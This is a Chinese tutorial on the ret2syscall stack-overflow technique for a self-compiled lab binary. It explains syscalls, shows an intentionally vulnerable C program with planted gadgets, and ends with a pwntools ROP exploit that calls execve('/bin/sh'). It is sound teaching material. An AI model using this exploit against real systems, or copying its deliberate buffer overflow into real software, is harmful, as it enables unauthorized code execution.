---
title: "ret2syscall"
description: ""
lead: ""
date: 2023-03-28T21:07:32+08:00
lastmod: 2023-03-28T21:07:32+08:00
draft: false
images: []
menu:
  docs:
    parent: "stackoverflow"
    identifier: "ret2syscall-0eacdc5627a9d644483a912a87526e3d"
weight: 2
toc: true
---

## 0x01 介绍

syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 `int 0x80` 指令来执行系统调用，而64位程序则是通过 `syscall` 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 `/usr/include/asm/unistd.h` 找到32位和64位的系统调用号分别存储的文件

![bd451c85c8cfb9e7a7d71f72d4318dcd](images/bd451c85c8cfb9e7a7d71f72d4318dcd.png)  

我们可以看一下32位的系统调用号

![34359385b45288b164e6531b2dc74bcf](images/34359385b45288b164e6531b2dc74bcf.png)  

前部分是系统调用名称，比如 `__NR_read` 就是read系统调用，而后半部分就是系统调用号，都是数字，例如 `3` 就是read的系统调用号0。64位的系统调用号也是同理。

当执行内陷指令之前，需要将系统调用号传入ax寄存器中。其次需要在执行内陷指令前要做的就是传递参数给内核，这里不管是32位还是64位的程序都必须用寄存器来传递参数。对于32位来说，参数寄存器的传递顺序是 `ebx、ecx、edx、esi、edi` ，对于64位来说顺序为 `rdi、rsi、rdx、rcx、r8、r9` 。我们以内联汇编的形式来实现一个简单的系统调用

```c
char *buf = "hello world\n";
void main();
asm(
    ".text\n"
    ".global main\n"
    "main:\n"
    // write(1, "hello world\n", 12)
    "mov ebx, 1\n"    // 第一个参数，标准输出流
    "mov ecx, buf\n"    // 第二个参数，字符串地址
    "mov edx, 12\n"    // 第三个参数，输出字节数
    "mov eax, 4\n"    // write的系统调用号
    "int 0x80\n"    // 内陷指令
);
// gcc test.c -o test -m32 -masm=intel
```

运行效果为

![c0fa4df1d7b98a107b9db88fc1f73c30](images/c0fa4df1d7b98a107b9db88fc1f73c30.png)  

而ret2syscall它要完成的就是去调用某个系统调用来完成getshell的操作。ret2syscall作为ROP系列之一，它的核心还是溢出，不过它的难点就在于溢出后的步骤。之前的ret2text是直接返回到程序中已有的getshell代码片段，ret2syscall则没有现成的getshell代码片段出现，它获取shell的方式是通过多个代码片段之间的跳转执行，我们称这多个代码片段组成的类似于链状的执行过程称为ROP链。大概流程如下

![04f861564255fd35278467fc20a8b9d0](images/04f861564255fd35278467fc20a8b9d0.png)  

大概来解释这幅图，首先当执行到函数的ret指令时，ret会跳转到当前栈顶指向的代码处执行，并将当前栈顶移动到下一个栈单元，这里我们将其覆盖成了修改参数寄存器代码片段的地址，接下来一段时间都会去执行修改参数寄存器的操作，直到执行到代码片段的ret指令，对于这条ret指令来说其跳转的地址就是图中第一条虚线即修改ax寄存器的代码片段的地址（应为当前栈顶就是该栈单元），接着就会去执行修改ax寄存器的代码，直到执行到其ret指令处，对于它的ret指令来说返回地址是第二条虚线即内陷指令地址，最后跳转执行内陷指令后即可获取到shell。当然实际情况可能会比这个复杂很多。

对于ret2syscall来说有几个代码片段是必须要有的，首先就是内陷指令片段，正常的程序一般不会有内陷指令，如果有内陷指令的题目大概路就是ret2syscall的方式去解决。其次就是控制ax寄存器的指令，只有控制了ax寄存器才可以设定我们想要的系统调用号。最后就是设定参数的代码片段，每个参数寄存器必须设置为指定的值，否则大概率都是执行失败。

我们以一个例子来说

```c
#include<stdio.h>
char *bin_sh = "/bin/sh";
void hint();
asm(
    ".text\n"
    ".global hint\n"
    "hint:\n"
    "inc eax\n"
    "ret\n"
    "xor eax, eax\n"
    "xor ebx, ebx\n"
    "xor ecx, ecx\n"
    "xor edx, edx\n"
    "ret\n"
    "int 0x80"
);

void run() {
    char buf[0x10];
    printf("input: ");
    scanf("%s", buf);
}

int main() {
    run();
    return 0;
}
// gcc ret2syscall.c -o ret2syscall -no-pie -fno-pic -fno-stack-protector -m32 -masm=intel
```

这里我们以内联汇编的方式写了一些必要的代码片段以完成ret2syscall的操作。在ret2syscall中获取shell的系统调用只有一种即 `execve` 系统调用，它的作用就是执行一个新的程序。execve接收三个参数，第一个参数是程序名称，第二个参数是给程序的参数，第三个参数是环境参数，对于shell来说只需要第一个参数设置为 `/bin/sh` 即可，后两个为null即0就行。

首先是找到修改参数寄存器的代码片段，在上面的源文件中可以很明显看到有 `xor ecx, ecx; xor edx, edx` 这两条指令可以完成第二、三两个参数寄存器的设置。而对于第一个参数寄存器的设置则需要通过其他指令来完成，通常寻找的是 `pop ebx; ret` 代码片段，该代码片段会将当前栈顶的值弹出存入到ebx中并返回下一个栈单元，如果我们在栈顶存入 `/bin/sh` 字符串地址则可以直接完成第一个参数寄存器的设置

![232fb5b32f5452ad8a9d67414334b4c5](images/232fb5b32f5452ad8a9d67414334b4c5.png)  

所有的参数寄存器都执行完成后即可对ax寄存器进行设置，这里存在一个 `inc eax; ret` 代码片段，它可以对eax进行加一的操作，我们只要多次执行这个代码片段直到ax寄存器为execve系统调用号的值就行。最后既可以跳转去执行内陷指令获取shell了。所以整个的栈布局为

![04f411c8c99c68955cdbe5866de7210e](images/04f411c8c99c68955cdbe5866de7210e.png)  

建议可以调试看看具体的ROP链执行过程

然后我们需要找出这些代码片段的地址，这里可以使用 `ROPgadget` 工具来查找

![0bb4220de7d1cd13dbbce3991431580b](images/0bb4220de7d1cd13dbbce3991431580b.png)  

![55b4ddbfa236719c41cc04708c4239b8](images/55b4ddbfa236719c41cc04708c4239b8.png)  

![8748ec9f9380ccc2ff4d633953cc64c8](images/8748ec9f9380ccc2ff4d633953cc64c8.png)  

![b6936a41caea9de420af66aafac841ad](images/b6936a41caea9de420af66aafac841ad.png)  

而execve的系统调用号在文件中可以查到为 `11` ，通过调试我们可以知道当run函数执行到ret指令的时候eax寄存器的值为1。

![4bffa0dbc1505963a34132bb1f4b608b](images/4bffa0dbc1505963a34132bb1f4b608b.png)  

所以inc指令只需要执行10次即可。最终可以写出Exploit

```python
from pwn import*
o = process("./ret2syscall")
bin_sh = 0x8048550    # /bin/sh字符串地址
pop_ebx = 0x8048311    # pop ebx;ret代码片段地址
xor_ret = 0x8048471    # xor ecx, ecx;xor edx, edx;ret代码片段地址
int_80 = 0x8048476    # int 0x80代码片段地址
inc_eax = 0x804846b    # inc eax;ret代码片段地址
payload = b'a'*28    # 填充局部变量和函数返回地址之间的空隙
payload += p32(pop_ebx) + p32(bin_sh)    # 设置第一个参数寄存器
payload += p32(xor_ret)    # 设置第二三个参数寄存器
payload += p32(inc_eax)*10   # eax累加到11
payload += p32(int_80)    # 执行系统调用
o.sendline(payload)
o.interactive()
```

![aa241111f472d5e8dc9d1eed30c466bc](images/aa241111f472d5e8dc9d1eed30c466bc.png)
